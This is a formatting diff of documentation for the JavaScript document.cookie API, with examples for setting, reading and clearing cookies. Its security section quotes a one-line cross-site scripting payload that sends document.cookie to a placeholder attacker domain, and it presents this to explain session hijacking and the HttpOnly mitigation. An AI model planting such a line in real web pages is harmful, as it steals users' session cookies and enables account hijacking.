@@ -53,8 +53,8 @@ In the code above, `newCookie` is a string of form `key=value`, specifying the c
     > users specify that cookies should never expire, which is not
     > necessarily safe.
 
-      See {{jsxref("Date.toUTCString()")}} for help formatting this
-      value.
+    See {{jsxref("Date.toUTCString()")}} for help formatting this
+    value.
 
   - `;max-age=max-age-in-seconds`: The maximum age of the cookie in seconds (e.g.,
     `60*60*24*365` or 31536000 for a year).
@@ -115,13 +115,13 @@ document.cookie = "name=oeschger; SameSite=None; Secure";
 document.cookie = "favorite_food=tripe; SameSite=None; Secure";
 
 function showCookies() {
-  const output = document.getElementById('cookies')
-  output.textContent = `> ${document.cookie}`
+  const output = document.getElementById("cookies");
+  output.textContent = `> ${document.cookie}`;
 }
 
 function clearOutputCookies() {
-  const output = document.getElementById('cookies')
-  output.textContent = ''
+  const output = document.getElementById("cookies");
+  output.textContent = "";
 }
 ```
 
@@ -148,18 +148,18 @@ document.cookie = "test1=Hello; SameSite=None; Secure";
 document.cookie = "test2=World; SameSite=None; Secure";
 
 const cookieValue = document.cookie
-  .split('; ')
-  .find((row) => row.startsWith('test2='))
-  ?.split('=')[1];
+  .split("; ")
+  .find((row) => row.startsWith("test2="))
+  ?.split("=")[1];
 
 function showCookieValue() {
-  const output = document.getElementById('cookie-value')
-  output.textContent = `> ${cookieValue}`
+  const output = document.getElementById("cookie-value");
+  output.textContent = `> ${cookieValue}`;
 }
 
 function clearOutputCookieValue() {
-  const output = document.getElementById('cookie-value')
-  output.textContent = ''
+  const output = document.getElementById("cookie-value");
+  output.textContent = "";
 }
 ```
 
@@ -182,21 +182,26 @@ In order to use the following code, please replace all occurrences of the word
 
 ```js
 function doOnce() {
-  if (!document.cookie.split('; ').find((row) => row.startsWith('doSomethingOnlyOnce'))) {
+  if (
+    !document.cookie
+      .split("; ")
+      .find((row) => row.startsWith("doSomethingOnlyOnce"))
+  ) {
     // Note that we are setting `SameSite=None;` in this example because the example
     // needs to work cross-origin.
     // It is more common not to set the `SameSite` attribute, which results in the default,
     // and more secure, value of `SameSite=Lax;`
-    document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";
+    document.cookie =
+      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";
 
-    const output = document.getElementById('do-once')
-    output.textContent = '> Do something here!'
+    const output = document.getElementById("do-once");
+    output.textContent = "> Do something here!";
   }
 }
 
 function clearOutputDoOnce() {
-  const output = document.getElementById('do-once')
-  output.textContent = ''
+  const output = document.getElementById("do-once");
+  output.textContent = "";
 }
 ```
 
@@ -220,15 +225,16 @@ function resetOnce() {
   // needs to work cross-origin.
   // It is more common not to set the `SameSite` attribute, which results in the default,
   // and more secure, value of `SameSite=Lax;`
-  document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";
+  document.cookie =
+    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";
 
-  const output = document.getElementById('reset-once')
-  output.textContent = '> Reset!'
+  const output = document.getElementById("reset-once");
+  output.textContent = "> Reset!";
 }
 
 function clearOutputResetOnce() {
-  const output = document.getElementById('reset-once')
-  output.textContent = ''
+  const output = document.getElementById("reset-once");
+  output.textContent = "";
 }
 ```
 
@@ -254,15 +260,17 @@ function clearOutputResetOnce() {
 document.cookie = "reader=1; SameSite=None; Secure";
 
 function checkACookieExists() {
-  if (document.cookie.split(';').some((item) => item.trim().startsWith('reader='))) {
-    const output = document.getElementById('a-cookie-existence')
-    output.textContent = '> The cookie "reader" exists'
+  if (
+    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
+  ) {
+    const output = document.getElementById("a-cookie-existence");
+    output.textContent = '> The cookie "reader" exists';
   }
 }
 
 function clearOutputACookieExists() {
-  const output = document.getElementById('a-cookie-existence')
-  output.textContent = ''
+  const output = document.getElementById("a-cookie-existence");
+  output.textContent = "";
 }
 ```
 
@@ -282,15 +290,15 @@ function clearOutputACookieExists() {
 
 ```js
 function checkCookieHasASpecificValue() {
-  if (document.cookie.split(';').some((item) => item.includes('reader=1'))) {
-    const output = document.getElementById('a-specific-value-of-the-cookie')
-    output.textContent = '> The cookie "reader" has a value of "1"'
+  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
+    const output = document.getElementById("a-specific-value-of-the-cookie");
+    output.textContent = '> The cookie "reader" has a value of "1"';
   }
 }
 
 function clearASpecificValueOfTheCookie() {
-  const output = document.getElementById('a-specific-value-of-the-cookie')
-  output.textContent = ''
+  const output = document.getElementById("a-specific-value-of-the-cookie");
+  output.textContent = "";
 }
 ```
 
@@ -322,7 +330,7 @@ session. Stealing a cookie from a web application leads to hijacking the
 authenticated user's session. Common ways to steal cookies include using [social engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) or by exploiting a [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) vulnerability in the application -
 
 ```js
-(new Image()).src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
+new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
 ```
 
 The `HTTPOnly` cookie attribute can help to mitigate this attack by
